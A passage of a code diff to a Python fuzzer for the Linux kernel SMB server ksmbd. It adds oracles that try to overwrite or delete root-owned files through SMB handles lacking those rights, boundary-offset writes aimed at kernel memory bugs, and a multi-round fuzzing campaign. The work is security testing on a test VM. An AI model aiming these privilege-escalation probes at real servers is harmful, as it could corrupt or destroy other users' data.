+               "delete-on-close unlinked a root-owned file from a 0755 root dir",
+               body, st, not victim.exists(), "delete-on-close: root file survived")
+        try: _plant()
+        except Exception: pass
+
+        # (3) direct SMB2_WRITE on a read-only handle.
+        body = self._create_body("xu\\rov", self.RO, DISP_OPEN, FILE_NON_DIRECTORY_FILE)
+        self._probe(self._CREATE, body)
+        f = self._fid()
+        if f:
+            self._probe(self._WRITE, self._write_body(f, 0, b"HACKED"))
+            self._probe(self._CLOSE, self._close_body(f))
+        after = victim.read_bytes() if victim.exists() else b""
+        _check("XUSER_WRITE_WITHOUT_WRITE", "MS-SMB2 3.3.5.13 / POSIX",
+               "SMB2_WRITE on a read-only handle modified a root-owned file", body, 0,
+               after != SECRET, "direct write on RO handle: root data intact")
+
+    # Deterministic sweep — run it once per worker process, not every cycle.
+    _ran = False
+
+    def run(self):
+        if DataflowDirector._ran:
+            return self.ready
+        DataflowDirector._ran = True
+
+        rc = self.lib.pfz_probe_init_share(b"privtest")
+        if rc != 0:
+            print(f"  [director] probe auth to [privtest] FAILED (rc={rc}) — oracle "
+                  f"disabled. Check: 'fuzz' user exists, [privtest] share present, "
+                  f"NTLMv2 (see [probe] lines above).", flush=True)
+            return False
+        self.ready = True
+        print(f"  [director] authenticated to [privtest]; running write-side contract "
+              f"oracle (kallsyms {f'ON — {self.tmap.resolved}/{len(TargetMap.TARGETS)} targets resolved' if self.tmap.ranges else 'OFF — provenance limited'})",
+              flush=True)
+
+        full = (FILE_READ_DATA | FILE_WRITE_DATA | FILE_DELETE |
+                FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES)
+        # Pre-create the victim file (writable) so OVERWRITE_IF/DELETE see it present.
+        self._probe(0x0005, self._create_body("i2s_victim", full, DISP_OPEN_IF,
+                                               FILE_NON_DIRECTORY_FILE))
+        fid = self._fid()
+        if fid:
+            self._probe(0x0009, self._write_body(fid, 0, b"PRECIOUS DATA"))
+            self._probe(0x0006, self._close_body(fid))
+
+        nflag = 0
+        for access, disp, copts, label in self.DANGEROUS:
+            name = "i2s_victim" if not (copts & FILE_DIRECTORY_FILE) else "i2s_victim_dir"
+            if copts & FILE_DIRECTORY_FILE:   # ensure a victim directory exists
+                self._probe(0x0005, self._create_body(name, full, DISP_OPEN_IF,
+                                                       FILE_DIRECTORY_FILE))
+                d = self._fid()
+                if d:
+                    self._probe(0x0006, self._close_body(d))
+            body = self._create_body(name, access, disp, copts)
+            resp, status = self._probe(0x0005, body)
+            recs = self._records()
+            sent = {"access": access, "disposition": disp, "coptions": copts}
+            viols = self._violations(access, disp, copts, file_present=1)
+            accepted = status == 0
+            flagged = bool(viols) and accepted
+            st = (status & 0xFFFFFFFF) if status is not None else 0xFFFFFFFF
+            print(f"  [director] CREATE {label}: NTSTATUS=0x{st:08x} "
+                  f"{'ACCEPTED' if accepted else 'rejected'}"
+                  f"{' → owner-probe (coverage only, NOT a violation)' if flagged else ''}", flush=True)
+            if verbose_on():
+                obs = self._create_flag_calls(recs)
+                i2s = {o: hex(v) for o, (v, w, fn, ai) in self._i2s_map(body, recs).items()
+                       if fn == "smb2_create_open_flags"}
+                vlog(f"director/{label}: dataflow smb2_create_open_flags args="
+                     f"{[{k: hex(v) for k, v in o.items()} for o in obs]} "
+                     f"i2s byte→arg offsets={i2s}")
+            # This owner-on-own-file sweep drives smb2_create_open_flags coverage +
+            # i2s mapping, but it CANNOT prove a violation: fuzz OWNS these victims,
+            # so ksmbd/POSIX legitimately grants every op (all 5 prior "findings"
+            # were false positives — see findings/TRIAGE-contract-oracle.md). Do NOT
+            # emit here; the real, effect-verified check is _cross_user_oracle().
+            if flagged:
+                nflag += len(viols)
+            fid = self._fid()
+            if fid and resp is not None:
+                self._probe(0x0006, self._close_body(fid))
+
+        print(f"  [director] owner CREATE sweep done: {nflag} contract-shaped op(s) "
+              f"(coverage/i2s only — NOT violations; fuzz owns these files).", flush=True)
+
+        # REAL write-side LPE oracle: root-owned victim, judged by EFFECT (#39).
+        self._cross_user_oracle()
+
+        # Positive control — makes a silent sweep interpretable (#2).
+        self._positive_control(full)
+
+        # ksmbd_vfs_write I2S: open writable, drive count/pos to boundaries so the
+        # offset/length input bytes map to ksmbd_vfs_write() args. OOB surfaces via
+        # KASAN — check dmesg right after the boundary sweep so we attribute it.
+        self._probe(0x0005, self._create_body("i2s_victim", full, DISP_OPEN_IF,
+                                               FILE_NON_DIRECTORY_FILE))
+        wfid = self._fid()
+        if wfid:
+            BOUND = [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF,
+                     0xFFFFFFFFFFFFFFFF, 1 << 40, (1 << 63)]
+            for off in BOUND:
+                body = self._write_body(wfid, off, b"A" * 64)
+                self._probe(0x0009, body)
+                self._i2s_map(body, self._records())  # offset→ksmbd_vfs_write arg
+            self._probe(0x0006, self._close_body(wfid))
+            # Any KASAN/OOB from the boundary writes surfaces on the serial
+            # console (host-side grep), not via an in-process dmesg read.
+
+        # New oracles (run once per worker, after the write-side sweep). Each
+        # rebuilds its own clean session, so ordering is independent; the
+        # destructive teardown oracle runs last. KASAN/lockdep from any of these
+        # lands on the serial console with the [uaf]/[lease]/[race]/[frag] markers.
+        self._lease_oracle(full)          # lease-grant contract (task #4)
+        self._race_integrity_oracle(full) # race state-divergence (fire-and-forget fix)
+        self._frag_pass(full)             # loopback short-read framing (limitation #2)
+        self._teardown_oracle(full)       # session/tree UAF (task #2, highest-yield)
+        self._flush_return_tokens()       # RedQueen return-value dict (upgrade 3)
+        self._distill()                   # arbiter: write g_fb for next round's mutate_i2s
+        return True
+
+
+def run_dataflow_director(lib, worker_octet=1):
+    """Always-on write-side oracle + I2S probe. Safe no-op if the probe can't
+    authenticate (e.g. [privtest] share absent)."""
     try:
-        import sys; sys.path.insert(0, str(SCRIPT_DIR))
-        # sharp merged below
+        return DataflowDirector(lib, worker_octet).run()
+    except Exception as e:
+        import traceback
+        print(f"  [director] error: {e!r}", flush=True)
+        traceback.print_exc()
+        return False
 
-        class SimpleDf:
-            def __init__(self): self._enabled = False
-            def enable(self):
-                try:
-                    fd = os.open('/sys/kernel/debug/kcov_dataflow', os.O_RDWR)
-                    import fcntl
-                    fcntl.ioctl(fd, KCOV_DF_INIT, BUF_WORDS)
-                    fcntl.ioctl(fd, KCOV_DF_REMOTE_ENABLE, 0)
-                    self._fd = fd
-                    self._enabled = True
-                except: self._enabled = False
-            def disable(self):
-                if self._enabled:
-                    try:
-                        import fcntl
-                        fcntl.ioctl(self._fd, KCOV_DF_REMOTE_DISABLE, 0)
-                    except: pass
-            def read_words(self): return []
 
-        df = SimpleDf()
-        fpath = f'{MOUNT}/fuzz_target'
-        print("  [sharp] Running boundary search + race analysis...")
-        run_sharp_analysis(df, fpath, shared_vpool, global_features)
-        _anomaly_detector.report()
-        _sequence_learner.report()
-        # Logic-bug detection: trust boundary violations
-        # sharp merged below
-        _trust_checker.report()
-    except Exception:
-        pass
+# ─── Combination fuzzing phase (needs -procs >= 2) ────────────────────────────
+# Each worker process hammers ONE operation; the phase runs every
+# combinations_with_replacement of the operation set across the N procs so that,
+# e.g., {vfs_write ∥ kerberos} run *concurrently* against ksmbd to surface
+# cross-operation interaction / state-corruption bugs (KASAN). Ordered
+# high-priority (privileged write) → low-priority (negotiate/kerberos).
 
-    elapsed = time.time() - t0
-    print(f"\n{'='*60}")
-    print(f"COMPLETE: {rounds} rounds × {procs} workers + libFuzzer in {elapsed:.0f}s")
-    print(f"Total features: {total_feat} | Transitions: {total_trans} | Raw PDU: {total_raw}")
-    print(f"Persistent corpus: {len(seed_corpus)} entries saved to {CORPUS_DB}")
-    print(f"{'='*60}")
+# Combination procedures, write/LPE-relevant first. negotiate/kerberos are
+# deliberately EXCLUDED: they are low-priority control-plane ops and the
+# negotiate parser floods thousands of deassemble_neg_contexts errors per round
+# while adding no write-side coverage.
 
-    _campaign.print_histogram()
 
-# ─── Main ─────────────────────────────────────────────────────────────────────
+# -target → which COMBO_TARGETS participate (mirrors the grain TARGET_MAP so
+# focusing the campaign also focuses the combination space — e.g. -target write
+# only combines write-side ops, never negotiate/kerberos).
+
+
+PERSISTENT_CORPUS = Path('/tmp/ksmbdzzer_corpus_persistent')
+
 
 def cmd_validate(args):
     """Run a fast validation campaign checking that known CVE patterns trigger bugs.
@@ -1500,104 +1595,384 @@ def cmd_validate(args):
     # Init
     cmd_init(install_deps=False)
 
-    # Run snipers only (no full discovery — just check if bugs trigger)
+    # Run grains only (no full discovery — just check if bugs trigger)
     import sys; sys.path.insert(0, str(SCRIPT_DIR))
-    from sniper import generate_all_snipers, run_snipers
+    from grain import generate_all_grains, run_grains
 
-    snipers = generate_all_snipers([0x1000, 0xFFFF, 0x10000, 0x7FFFFFFF])
-    print(f"[*] Generated {len(snipers)} snipers")
+    grains = generate_all_grains([0x1000, 0xFFFF, 0x10000, 0x7FFFFFFF])
+    print(f"[*] Generated {len(grains)} grains")
 
-    time_per = args.time if hasattr(args, 'time') and args.time else 10
-    print(f"[*] Running each sniper for {time_per}s...")
-    crashes = run_snipers(snipers, time_per=time_per)
+    _max = args.time if hasattr(args, 'time') and args.time else 60
+    print(f"[*] Running each grain until saturation (ceiling {_max}s)...")
+    crashes = run_grains(grains, sat_ratio=0.02, max_time=_max, parallelism=4)
 
     # Also check dmesg
-    bugs = os.popen("dmesg | grep -cE 'BUG:.*ksmbd|BUG:.*smb|UBSAN:.*smb|BUG: KASAN' 2>/dev/null").read().strip()
+    bugs = os.popen("dmesg | grep -cE 'BUG: KASAN|BUG: unable to handle|general protection fault|stack-protector|refcount_t:.*underflow|refcount_t:.*overflow|double-free|Oops|UBSAN:.*ksmbd|UBSAN:.*smb|BUG:.*ksmbd|BUG:.*smb|WARNING:.*ksmbd|WARNING:.*smb|possible circular.*ksmbd|sleeping.*atomic.*ksmbd|Kernel panic' 2>/dev/null").read().strip()
     bug_count = int(bugs) if bugs.isdigit() else 0
 
     print()
     if crashes or bug_count > 0:
-        print(f"!!! VALIDATION: {len(crashes)} sniper crashes + {bug_count} kernel bugs detected !!!")
-        os.system("dmesg | tail -60 | grep -B1 -A10 'KASAN\\|UBSAN\\|ksmbd' | head -40")
+        print(f"!!! VALIDATION: {len(crashes)} grain crashes + {bug_count} kernel bugs detected !!!")
+        os.system("dmesg | tail -60 | grep -B2 -A15 -E 'KASAN|UBSAN|ksmbd|Oops|general protection|refcount_t|stack-protector' | head -45")
     else:
         print(f"VALIDATION: 0 bugs detected — kernel appears patched against tested patterns")
-    print(f"Snipers tested: dacl_setinfo, stream_oob, ea_alignment, lock_race, "
+    print(f"Grains tested: dacl_setinfo, stream_oob, ea_alignment, lock_race, "
           f"create_ctx, ndr_rpc, compound, spnego_auth")
 
 
-def cmd_campaign(args):
-    """Multi-phase write-side campaign optimized for long runs."""
-    hours = args.hours
-    procs = min(args.procs, 2)  # max 2 — ksmbd can't handle 4 aggressive workers
-    total_sec = hours * 3600
-    print(f"=== ksmbdzzer CAMPAIGN — {hours}h write-side LPE hunt ===")
-    print(f"  Workers: {procs}, Total budget: {total_sec}s")
-    print()
+def cmd_grain_fuzz(args):
+    """Clean 4-PHASE GRAIN orchestrator (the consolidated architecture):
+        P1 enumerate grains (the normal-scenario library)
+        P2 saturate each grain  — LibFuzzer harness, map-reduce parallel
+        P3 combine grains       — compound pairs (concurrent/race = parallel processes)
+        P4 save                 — grain corpora + value pool carried to next generation
+    Each grain is a "big grain": negotiation+auth+setup are the FIXED valid prefix
+    (in harness init), and the fuzzer drives only the LAST target point. No 12-phase
+    worker, no random tactics — deep-by-construction grains, directed mutation.
 
-    # Phase A: Discovery (15% of time)
-    phase_a_rounds = max(5, int(total_sec * 0.15) // 80)
-    print(f"--- Phase A: DISCOVERY ({phase_a_rounds} rounds) ---")
-    a_args = argparse.Namespace(rounds=phase_a_rounds, procs=procs, target='all', sniper_time=5)
-    cmd_fuzz(a_args)
+    DURABILITY (DONE): the distilled DB is host-mount durable (ksmbd/.fuzzdb, 9p) so
+    a VM wedge costs the in-flight round, not the campaign — g_fb is written there by
+    the arbiter, and corpus_save() mirrors CORPUS_DB (corpus+features+value_pool) to
+    FUZZDB/corpus.json each P4 (write-through; hot corpus stays in /tmp for speed).
+    ARBITER (DONE): DataflowDirector._distill() writes g_fb each round the director
+    authenticates → C mutate_i2s() steers next round with no recompile.
+    TODO(next-step): MEASURE-FIRST GATE — AUTH is now FIXED (2026-07-04, probe-test
+    status=0x00000000, director/oracle live; see [[ksmbdzzer-pool-auth-rootcause]]).
+    The remaining precondition is purely a measurement: run ONE oracle-live campaign,
+    confirm coverage plateaus at value-gates, THEN roll mutate_i2s out to the raw
+    harnesses via GRAIN_I2S_MUTATOR (each raw gen_* needs g_stuck + run_target).
+    No longer blocked — deferred only because no campaign is scheduled right now."""
+    import sys
+    sys.path.insert(0, str(SCRIPT_DIR))
+    from grain import (generate_grains, generate_grain_combo_grains,
+                        generate_grain_combo_pool, run_grains)
+    from itertools import combinations_with_replacement
+    rounds = getattr(args, 'round', 1)
+    procs = getattr(args, 'procs', None) or _default_procs()
+    sat = getattr(args, 'grain_sat', 0.02)
+    smax = getattr(args, 'grain_max', 60)
 
-    # Phase B: Deep snipers on write targets (55% of time)
-    sniper_deep_time = max(30, int(total_sec * 0.55) // 24)
-    print(f"\n--- Phase B: DEEP WRITE ({sniper_deep_time}s/sniper) ---")
-    b_args = argparse.Namespace(rounds=4, procs=procs, target='write', sniper_time=sniper_deep_time)
-    cmd_fuzz(b_args)
-    print(f"  [race phase]")
-    r_args = argparse.Namespace(rounds=4, procs=procs, target='race', sniper_time=sniper_deep_time)
-    cmd_fuzz(r_args)
+    seed_corpus, global_features, value_pool = corpus_load()   # P4 feed-forward
+    vpool = list(value_pool) or [0, 64, 4096, 0x1000, 0xFFFF, 0x40000116]
+    lib = _get_lib()
+    n = lib.pfz_grain_count()
+    grains = [(i, lib.pfz_grain_name(i).decode()) for i in range(n)]
+    # Focused testing (-t/--target GRAIN ...): run ONLY the named grains instead of the
+    # whole fleet — e.g. `gfuzz -t write copychunk` to iterate on specific procedures.
+    # Default (no -t) runs everything. Unknown names are warned and ignored.
+    _targets = getattr(args, 'target', None)
+    if _targets:
+        _sel = {t.strip() for t in _targets if t.strip()}
+        _known = {nm for (_i, nm) in grains}
+        _unknown = _sel - _known
+        if _unknown:
+            print(f"  [target] WARNING: unknown grain name(s) ignored: {sorted(_unknown)}",
+                  flush=True)
+        grains = [(i, nm) for (i, nm) in grains if nm in _sel]
+        print(f"  [target] focused run — {len(grains)} grain(s): "
+              f"{sorted(nm for _i, nm in grains)}", flush=True)
+        if not grains:
+            print("  [target] no matching grains — nothing to run.", flush=True)
+            return
+    print(f"ksmbdzzer 4-phase GRAIN fuzzer — {rounds} round(s), {procs} CPUs, {n} grains",
+          flush=True)
+    # In-guest watchdog: recover a USERSPACE stall (hung grain/wave) by killing the
+    # stuck grain children in-guest instead of letting the host reboot the VM. Kernel
+    # wedges (which starve this thread too) still fall through to the host watchdog.
+    _ig_stall = _start_inguest_watchdog()
+    print(f"  [in-guest watchdog] armed — unstick a userspace stall after {_ig_stall}s "
+          f"(no VM reboot; host watchdog stays the backstop for kernel wedges)", flush=True)
+    if value_pool:
+        print(f"  [P4 load] carried {len(value_pool)} pool values from prior generation",
+              flush=True)
+    # P3 combines ALL grains pairwise (r=2, full C(n+1,2) sweep) — no curated
+    # COMBO_CORE subset — so interaction bugs are discovered, not presupposed.
 
-    # Phase C: Sharp hunting (20% of time)
-    print(f"\n--- Phase C: SHARP HUNTING ---")
-    c_args = argparse.Namespace(rounds=5, procs=procs, target='boundary', sniper_time=60)
-    cmd_fuzz(c_args)
+    # P1 STABILITY ORACLE state: per-grain baseline ft0 (the bare working scenario's
+    # coverage). If a grain that worked before stops working in a later round, the
+    # fuzzing destabilized ksmbd → a (non-crashing) bug. Persisted across generations.
+    import json
+    STAB = Path('/tmp/ksmbdzzer_stability.json')
+    try:
+        baselines = json.loads(STAB.read_text()) if STAB.exists() else {}
+    except Exception:
+        baselines = {}
+    PCORP = Path('/tmp/ksmbdzzer_corpus_persistent')
 
-    # Phase D: Validate
-    print(f"\n--- Phase D: FINAL VALIDATION ---")
-    d_args = argparse.Namespace(time=30)
-    cmd_validate(d_args)
+    for rnd in range(1, rounds + 1):
+        print(f"{_dts()} --- Round {rnd}/{rounds} ---", flush=True)
+        # Whole round body in try/except: any UNEXPECTED phase failure (a raise, or a wave
+        # the in-guest watchdog had to kill) degrades THIS round instead of aborting the
+        # campaign — we log it and fall through to the P4 save + the next round. (Hangs with
+        # no timeout can't raise; the watchdog unsticks those so the wait returns here.)
+        try:
+            _pt = time.time()
+            print(f"{_dts()}   [P1 START] round {rnd}: build grain harnesses ({n} lib grains + raw)", flush=True)
+            ggrains = generate_grains(grains, vpool)
+            # The PROVEN raw-PDU grains: common.h harnesses that establish the working
+            # guest-auth prefix (smb_setup + CREATE) and fuzz the RAW target PDU — your
+            # principle, already implemented (create_ctx reaches ~ft3900). These reach
+            # deep on parse-rich commands; the lib grains fuzz semantic params.
+            try:
+                from grain import generate_all_grains, generate_v2_grains
+                raw_grains = generate_all_grains(vpool)
+                ggrains += raw_grains
+                # The CLEAN v2 hybrid grains: KCOV path coverage for the bulk, trace-args/
+                # ret directed mutation ONLY when stuck (all in the C harness). These are
+                # the proving-case grains vs the random-havoc raw grains above.
+                v2 = generate_v2_grains()
+                ggrains += v2
+                print(f"  [P1 grain] +{len(raw_grains)} raw-PDU grains + {len(v2)} v2 "
+                      f"hybrid grains (KCOV + trace-args/ret-at-stuck)", flush=True)
+            except Exception as e:
+                print(f"  [P1] raw-grain gen error: {e!r}", flush=True)
+            print(f"{_dts()}   [P1 END] {len(ggrains)} harnesses built in {time.time()-_pt:.0f}s", flush=True)
+            _pt = time.time()
+            print(f"{_dts()}   [P2 START] saturate {len(ggrains)} grain harnesses, {procs}-way "
+                  f"(per-grain LibFuzzer + trace-args/ret directed mutation)", flush=True)
+            p2_stats = {}
+            crashes = run_grains(ggrains, sat_ratio=sat, max_time=smax, parallelism=procs,
+                                  out_stats=p2_stats)
+            _p2prod = sum(1 for s in p2_stats.values() if s.get('productive'))
+            print(f"{_dts()}   [P2 END] {time.time()-_pt:.0f}s — {_p2prod}/{len(p2_stats)} grains productive"
+                  f"{f', {len(crashes)} CRASH' if crashes else ''}", flush=True)
+            if crashes:
+                print(f"  !!! CRASH in P2: {crashes}", flush=True)
+                corpus_save(seed_corpus, global_features, vpool)
+                return
 
-    print(f"\n{'='*60}")
-    print(f"CAMPAIGN COMPLETE: {hours}h write-side LPE hunt finished")
-    print(f"Check /tmp/ksmbdzzer_crashes/ for any findings")
-    print(f"{'='*60}")
+            # ── P1 STABILITY ORACLE: did any working grain STOP working this round? ──
+            # Re-running the bare grain each round is a canary: a normal scenario that
+            # reached deep before but now collapses means the prior round's fuzzing
+            # destabilized ksmbd's state — a real (non-crashing) bug. ft0 is exactly the
+            # bare-grain coverage, so we just compare it to the grain's known baseline.
+            for nm, s in p2_stats.items():
+                g = nm.replace('grain_', ''); cur = s.get('ft0', 0); base = baselines.get(g)
+                if base is None:
+                    if cur >= 100:
+                        baselines[g] = cur            # first solid observation = baseline
+                elif base >= 100 and cur < 0.5 * base:
+                    hist = PCORP / g
+                    nfiles = len(list(hist.iterdir())) if hist.is_dir() else 0
+                    print(f"  [!!! STABILITY] grain '{g}': baseline ft0={base} → now {cur} "
+                          f"— the NORMAL scenario STOPPED WORKING → ksmbd may be "
+                          f"DESTABILIZED (non-crashing state-corruption bug). Narrow with "
+                          f"its {nfiles}-input historic corpus at {hist}", flush=True)
+                else:
+                    baselines[g] = max(base, cur)     # ratchet the baseline up
+            try: STAB.write_text(json.dumps(baselines))
+            except Exception: pass
 
-    print(f"\n{'='*60}")
-    print(f"CAMPAIGN COMPLETE: {hours}h write-side LPE hunt finished")
-    print(f"Check /tmp/ksmbdzzer_crashes/ for any findings")
-    print(f"{'='*60}")
+            # ── DATAFLOW CONTRACT ORACLE (a check, not a phase) ──────────────────────
+            # The differentiating oracle: probe write-side access control via kcov-
+            # dataflow (e.g. ksmbd honoring WRITE/DELETE/LOCK on a handle whose granted
+            # access lacks that right — the non-crashing LPE class syzkaller is blind to).
+            # Run once per round on the shared lib AFTER P2, so it also acts as a
+            # contract-stability canary: a violation that appears only after fuzzing
+            # means the mutation corrupted server state. Safe no-op if the probe can't
+            # authenticate to [privtest]; any violation is written to FINDINGS_DIR.
+            try:
+                _before = len(list(FINDINGS_DIR.glob('*.json'))) if FINDINGS_DIR.exists() else 0
+                run_dataflow_director(lib, _WORKER_OCTET)
+                _after = len(list(FINDINGS_DIR.glob('*.json'))) if FINDINGS_DIR.exists() else 0
+                if _after > _before:
+                    print(f"  [!!! ORACLE] write-side contract VIOLATION — {_after-_before} new "
+                          f"reproducer(s) in {FINDINGS_DIR}", flush=True)
+                else:
+                    print(f"  [oracle] write-side contract check passed (no violation)", flush=True)
+            except Exception as _oe:
+                print(f"  [oracle] skipped: {_oe!r}", flush=True)
+
+            # Corpus growth report: each round must accumulate MORE coverage-beating
+            # inputs than the last. The real corpora are PCORP/grain_<name> (libFuzzer's
+            # own corpus dirs, persisted across rounds = the feed-forward).
+            total_corpus = sum(len([f for f in d.iterdir() if f.is_file()])
+                               for d in PCORP.iterdir() if d.is_dir()) if PCORP.is_dir() else 0
+            print(f"  [corpus] {total_corpus} accumulated coverage-beating inputs "
+                  f"(persisted → next round replays them)", flush=True)
+            # FEED-FORWARD check: a grain's ft0 (its FIRST ft = the loaded corpus's
+            # coverage) should JUMP across rounds, because round N replays round N-1's
+            # corpus. Track per-grain ft0 to prove round 1 feeds round 2.
+            ff = getattr(cmd_grain_fuzz, '_prev_ft0', {})
+            gained = [(nm.replace('grain_', ''), ff.get(nm, 0), s.get('ft0', 0))
+                      for nm, s in p2_stats.items() if s.get('ft0', 0) > ff.get(nm, 0) + 50]
+            if rnd > 1 and gained:
+                print(f"  [feed-forward] {len(gained)} grains START deeper this round "
+                      f"(corpus carried): " +
+                      ", ".join(f"{g}:{a}→{b}" for g, a, b in sorted(gained, key=lambda x: -x[2])[:6]),
+                      flush=True)
+            cmd_grain_fuzz._prev_ft0 = {nm: s.get('ft0', 0) for nm, s in p2_stats.items()}
+
+            # ── P3 COMBINATION: FULL all-pairs sweep (r=2 over EVERY grain) ──────────
+            # Design change: combine ALL grains pairwise with replacement — C(n+1,2)
+            # pairs (95 grains → 4,560) — NOT a curated COMBO_CORE subset. The point of
+            # combination is to DISCOVER interaction bugs, so we don't presuppose which
+            # grains matter; every pair is a candidate. This is tractable because the
+            # pool is ONE compiled generic harness + a per-pair symlink (grain_gc_a_b),
+            # and run_grains schedules all 4,560 through the `-procs`-bounded execution
+            # pool (max `procs` concurrent), so the phase is run-bound, not compile-bound.
+            pairs = [(a, na, b, nb)
+                     for (a, na), (b, nb) in combinations_with_replacement(grains, 2)]
+            # P3 is the expensive tail (4,560 runs). It is a REFINEMENT, not a feed-
+            # forward step, so run it ONLY on the final round — intermediate rounds stay
+            # a fast P1→P2→P4 loop so round N actually feeds round N+1.
+            if pairs and rnd != rounds:
+                print(f"{_dts()}   [P3 skip] {len(pairs)} all-pairs combos deferred to final "
+                      f"round (intermediate rounds stay fast so feed-forward reaches round "
+                      f"{rnd+1})", flush=True)
+                pairs = []
+            if pairs:
+                _pt = time.time()
+                _cf0 = len(list(FINDINGS_DIR.glob('*.json'))) if FINDINGS_DIR.exists() else 0
+                cgrains = generate_grain_combo_pool(pairs, vpool)   # 1 compile + symlinks
+                print(f"{_dts()}   [P3 START] combination phase: {len(cgrains)}/{len(pairs)} "
+                      f"all-pairs grain combos (C({n}+1,2), r=2 over every grain), {procs}-way "
+                      f"execution pool — the highest crash/finding-yield phase", flush=True)
+                _ccrash = run_grains(cgrains, sat_ratio=sat, max_time=smax, parallelism=procs)
+                _cf1 = len(list(FINDINGS_DIR.glob('*.json'))) if FINDINGS_DIR.exists() else 0
+                print(f"{_dts()}   [P3 END] {time.time()-_pt:.0f}s — {len(cgrains)} combos run, "
+                      f"{_cf1-_cf0} new finding(s)"
+                      f"{f', {len(_ccrash)} CRASH' if _ccrash else ''}", flush=True)
+                if _ccrash:
+                    print(f"{_dts()}   !!! CRASH in P3 combine: {_ccrash}", flush=True)
+            else:
+                print(f"{_dts()}   [P3 END] no combination this round (deferred to final round)", flush=True)
+        except Exception as _round_err:
+            import traceback
+            print(f"{_dts()}   [!!! ROUND {rnd} FAILED] {_round_err!r} — degrading this round; "
+                  f"saving the corpus and continuing to the next round", flush=True)
+            traceback.print_exc()
+        # P4 ALWAYS runs — even after a failed/aborted round — so the accumulated corpus +
+        # value pool survive and feed the next generation (crash-resilient continuity).
+        try:
+            _pt = time.time()
+            print(f"{_dts()}   [P4 START] persist grain corpora + value pool (feed-forward to next round)",
+                  flush=True)
+            corpus_save(seed_corpus, global_features, list(vpool))   # P4
+            print(f"{_dts()}   [P4 END] {time.time()-_pt:.1f}s — corpora + pool carried → next generation "
+                  f"deeper", flush=True)
+        except Exception as _p4e:
+            print(f"{_dts()}   [P4] corpus save failed: {_p4e!r}", flush=True)
+    print("=== 4-phase grain campaign done ===", flush=True)
+
+
+def _default_procs():
+    """Default parallelism = the machine's usable CPU count (cgroup/taskset-aware),
+    so every phase (grain saturation, combination) utilizes all cores by default."""
+    try:
+        return max(1, len(os.sched_getaffinity(0)))
+    except Exception:
+        return os.cpu_count() or 4
 
 
 def main():
-    parser = argparse.ArgumentParser(description='ksmbdzzer — KSMBD write-side LPE fuzzer')
-    sub = parser.add_subparsers(dest='cmd')
+    parser = argparse.ArgumentParser(
+        prog='ksmbdzzer.py',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description=(
+            'ksmbdzzer — kcov-dataflow-guided, SMB-procedure "grain" fuzzer for the\n'
+            'Linux in-kernel SMB server (ksmbd). Authorized DEFENSIVE hardening only.\n'
+            '\n'
+            'Each grain is a deep-by-construction harness: a FIXED valid prefix\n'
+            '(negotiate + NTLMv2 auth + tree-connect + open a real fid) with only the\n'
+            'LAST SMB2/SMB3 endpoint fuzzed, so mutation lands on real server state\n'
+            'instead of the parser front door. Round-based, not time-based.'),
+        epilog=(
+            'typical workflow (run inside the virtme-ng guest):\n'
+            '  ksmbdzzer.py init                        # bring up ksmbd + share + RDMA + KDC\n'
+            '  ksmbdzzer.py gfuzz -r 5 --grain-max 25 # 5 rounds over the whole grain fleet\n'
+            '  ksmbdzzer.py gfuzz -r 5 -t write copychunk reparse   # focus a few grains\n'
+            '  ksmbdzzer.py probe-test                  # one-shot write-side oracle check\n'
+            '\n'
+            "run 'ksmbdzzer.py <command> -h' for per-command options.\n"
+            'the engine comparison (dataflow vs pc-only) is driven by '
+            '~/engine_compare_campagin.sh.'),
+    )
+    sub = parser.add_subparsers(dest='cmd', metavar='<command>')
 
-    ip = sub.add_parser('init')
-    ip.add_argument('--install-deps', action='store_true')
+    ip = sub.add_parser(
+        'init', help='Set up the target: ksmbd + share + Soft-RDMA + KDC',
+        description=(
+            'Prepare the in-guest target before fuzzing: create the share/mount dirs,\n'
+            'load the ksmbd module, provision the fuzz:fuzz SMB user, bring up Software\n'
+            'RDMA (SIW/RXE) for SMBDirect, (re)start ksmbd.mountd, mount //127.0.0.1/share,\n'
+            'and start an optional KDC for the Kerberos path. Each step logs [init] N/9 so a\n'
+            'stall is attributable. Safe to re-run (idempotent). Run this ONCE per boot\n'
+            'before gfuzz.'))
+    ip.add_argument('--install-deps', action='store_true',
+                    help='apt-get install the runtime deps first (ksmbd-tools, cifs-utils, '
+                         'smbclient, krb5, rdma-core). Usually already present in the image.')
 
-    fp = sub.add_parser('fuzz', help='Write-side focused fuzzing')
-    fp.add_argument('-rounds', type=int, default=1)
-    fp.add_argument('-procs', type=int, default=2)
-    fp.add_argument('-t', type=str, default=None, help='Timeout: 30m, 1h, 5h, 90s (graceful save+exit)')
-    fp.add_argument('-target', choices=['all', 'write', 'race', 'dacl', 'boundary'],
-                    default='all', help='Focus area')
-    fp.add_argument('-sniper-time', type=int, default=3, help='Seconds per sniper')
+    vp = sub.add_parser('validate', help='Quick liveness/sanity check of the target')
+    vp.add_argument('-time', type=int, default=10, help='Seconds to probe (default: 10).')
 
-    cp = sub.add_parser('campaign', help='Multi-phase campaign (hours)')
-    cp.add_argument('-hours', type=int, default=5)
-    cp.add_argument('-procs', type=int, default=4)
+    sub.add_parser('probe-test', help='Run the dataflow director once and exit (fast oracle check)')
 
-    vp = sub.add_parser('validate')
-    vp.add_argument('-time', type=int, default=10)
+    gp = sub.add_parser(
+        'gfuzz', aliases=['fuzz'],
+        help='Run the fuzzer: 4-phase round-based GRAIN campaign',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description=(
+            'Round-based GRAIN fuzzer (this is THE fuzzing command; `fuzz` is an alias).\n'
+            'Each round runs 4 phases:\n'
+            '  P1 enumerate — build one libFuzzer harness per grain (the normal-scenario library)\n'
+            '  P2 saturate  — fuzz each grain to coverage plateau, kcov-dataflow-directed, N-way\n'
+            '  P3 combine   — all-pairs compound of grains (interaction bugs) on the final round\n'
+            '  P4 save      — carry the strong grains + value pool forward to the next round\n'
+            'Rounds are generational: round N replays round N-1\'s corpus (feed-forward). The\n'
+            'corpus is mirrored to the host-durable .fuzzdb so a VM wedge costs a round, not the\n'
+            'campaign. NOTE: this is round-based — there is no time budget; use -r for depth.'),
+        epilog=(
+            'examples:\n'
+            '  ksmbdzzer.py gfuzz -r 5 --grain-max 25         # whole fleet, 5 rounds\n'
+            '  ksmbdzzer.py gfuzz -r 3 -t write copychunk       # only the write + copychunk grains\n'
